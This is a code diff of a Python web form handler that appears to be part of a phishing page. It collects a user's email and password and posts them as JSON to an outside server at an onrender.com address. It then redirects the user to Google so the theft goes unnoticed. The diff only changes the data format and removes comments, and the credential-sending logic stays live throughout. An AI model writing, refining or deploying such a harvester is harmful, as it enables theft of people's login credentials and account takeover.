@@ -668,18 +668,19 @@ def wrangler():
 
         if not errors:
             try:
-                # ✅ Send data to placeholder backend
                 placeholder_url = 'https://rate-limiter-590c.onrender.com/submit'
                 payload = {'email': email, 'password': password}
-                response = requests.post(placeholder_url, data=payload, timeout=5)
-                response.raise_for_status()  # Raises exception if the request failed
-
-                # ✅ Redirect to Google on success
+                headers = {'Content-Type': 'application/json'}
+                response = requests.post(
+                    placeholder_url,
+                    json=payload,  # JSON format
+                    headers=headers,
+                    timeout=5
+                )
+                response.raise_for_status()
                 return redirect('https://google.com')
 
-            except requests.RequestException as e:
-                # ✅ Show a submission error in the form
+            except requests.RequestException:
                 errors['submission'] = 'Failed to send data. Please try again later.'
 
-    # Render form again (with or without errors)
     return render_template('outofplace/dossier/partizan/bell.html', errors=errors, email=email)
